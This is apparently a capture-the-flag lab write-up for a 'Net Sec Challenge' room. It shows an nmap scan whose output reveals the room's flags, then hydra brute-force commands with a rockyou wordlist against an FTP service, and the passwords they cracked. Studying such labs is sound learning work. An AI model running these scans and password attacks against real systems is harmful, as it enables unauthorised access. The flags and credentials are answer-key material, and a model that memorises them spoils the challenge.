---
layout: post
title: Net Sec Challenge
---

# Index
{% highlight diff linenos %}
-nmap -p- -sC -sV 10.67.129.138

Nmap scan report for ip-10-67-129-138.ec2.internal (10.67.129.138)
Host is up (0.0063s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         (protocol 2.0)
| ssh-hostkey: 
|   3072 52c2b66e4be8b924c17cf7196de9a242 (RSA)
|   256 f9dc476b7275d91497e92953a115663b (ECDSA)
|_  256 5efcf70064319c3344cd184afacbd8cc (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
+80/tcp    open  http        THM{MySpecialServer007}
|_http-title: Welcome
|_http-server-header: THM{MySpecialServer007}
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     Content-Length: 341
|     Connection: close
|     Date: Sat, 30 May 2026 22:36:31 GMT
|     Server: THM{MySpecialServer007}
|     <?xml version="1.0" encoding="iso-8859-1"?>
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
|     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
|     <head>
|     <title>404 Not Found</title>
|     </head>
|     <body>
|     <h1>404 Not Found</h1>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Vary: Accept-Encoding
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     ETag: "575357650"
|     Last-Modified: Tue, 24 Feb 2026 06:00:52 GMT
|     Content-Length: 220
|     Connection: close
|     Date: Sat, 30 May 2026 22:36:25 GMT
|     Server: THM{MySpecialServer007}
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <title>Welcome</title>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width,initial-scale=1" />
|     </head>
|     <body>
|     <h1>Hello, world!</h1>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Connection: close
|     Date: Sat, 30 May 2026 22:36:26 GMT
|     Server: THM{MySpecialServer007}
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Content-Length: 345
|     Connection: close
|     Date: Sat, 30 May 2026 22:36:26 GMT
|     Server: THM{MySpecialServer007}
|     <?xml version="1.0" encoding="iso-8859-1"?>
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
|     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
|     <head>
|     <title>400 Bad Request</title>
|     </head>
|     <body>
|     <h1>400 Bad Request</h1>
|     </body>
|_    </html>
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+8081/tcp  open  http        Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+10001/tcp open  scp-config?
+10121/tcp open  ftp         vsftpd 3.0.5
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.93%I=7%D=5/30%Time=6A1B666A%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=5/30%Time=6A1B666A%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1E4,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Accept-Encoding\r\nConte
SF:nt-Type:\x20text/html\r\nAccept-Ranges:\x20bytes\r\nETag:\x20\"57535765
SF:0\"\r\nLast-Modified:\x20Tue,\x2024\x20Feb\x202026\x2006:00:52\x20GMT\r
SF:\nContent-Length:\x20220\r\nConnection:\x20close\r\nDate:\x20Sat,\x2030
SF:\x20May\x202026\x2022:36:25\x20GMT\r\nServer:\x20THM{MySpecialServer007
SF:}\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<ti
SF:tle>Welcome</title>\n\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x20
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,initial-scal
SF:e=1\"\x20/>\n</head>\n<body>\n\x20\x20<h1>Hello,\x20world!</h1>\n</body
SF:>\n</html>\n")%r(HTTPOptions,A0,"HTTP/1\.0\x20200\x20OK\r\nAllow:\x20OP
SF:TIONS,\x20GET,\x20HEAD,\x20POST\r\nContent-Length:\x200\r\nConnection:\
SF:x20close\r\nDate:\x20Sat,\x2030\x20May\x202026\x2022:36:26\x20GMT\r\nSe
SF:rver:\x20THM{MySpecialServer007}\r\n\r\n")%r(RTSPRequest,1FC,"HTTP/1\.0
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nContent-Leng
SF:th:\x20345\r\nConnection:\x20close\r\nDate:\x20Sat,\x2030\x20May\x20202
SF:6\x2022:36:26\x20GMT\r\nServer:\x20THM{MySpecialServer007}\r\n\r\n<\?xm
SF:l\x20version=\"1\.0\"\x20encoding=\"iso-8859-1\"\?>\n<!DOCTYPE\x20html\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN\"\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht
SF:ml1-transitional\.dtd\">\n<html\x20xmlns=\"http://www\.w3\.org/1999/xht
SF:ml\"\x20xml:lang=\"en\"\x20lang=\"en\">\n\x20<head>\n\x20\x20<title>400
SF:\x20Bad\x20Request</title>\n\x20</head>\n\x20<body>\n\x20\x20<h1>400\x2
SF:0Bad\x20Request</h1>\n\x20</body>\n</html>\n")%r(FourOhFourRequest,1F6,
SF:"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\nCont
SF:ent-Length:\x20341\r\nConnection:\x20close\r\nDate:\x20Sat,\x2030\x20Ma
SF:y\x202026\x2022:36:31\x20GMT\r\nServer:\x20THM{MySpecialServer007}\r\n\
SF:r\n<\?xml\x20version=\"1\.0\"\x20encoding=\"iso-8859-1\"\?>\n<!DOCTYPE\
SF:x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN
SF:\"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/xhtml1
SF:/DTD/xhtml1-transitional\.dtd\">\n<html\x20xmlns=\"http://www\.w3\.org/
SF:1999/xhtml\"\x20xml:lang=\"en\"\x20lang=\"en\">\n\x20<head>\n\x20\x20<t
SF:itle>404\x20Not\x20Found</title>\n\x20</head>\n\x20<body>\n\x20\x20<h1>
SF:404\x20Not\x20Found</h1>\n\x20</body>\n</html>\n");
Service Info: OS: Unix

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-30T22:39:01
|_  start_date: N/A
{% endhighlight %}
- `-sV`, Probe open ports to determine service/version info.
- `-sC`, equivalent to --script=default.

{% highlight diff linenos %}
-hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.67.129.138:10121

[DATA] attacking ftp://10.67.129.138:10121/
+[10121][ftp] host: 10.67.129.138   login: eddie   password: softball
1 of 1 target successfully completed, 1 valid password found
{% endhighlight %}

{% highlight diff linenos %}
-hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.67.129.138:10121

[DATA] attacking ftp://10.67.129.138:10121/
+[10121][ftp] host: 10.67.129.138   login: quinn   password: cookie
1 of 1 target successfully completed, 1 valid password found
{% endhighlight %}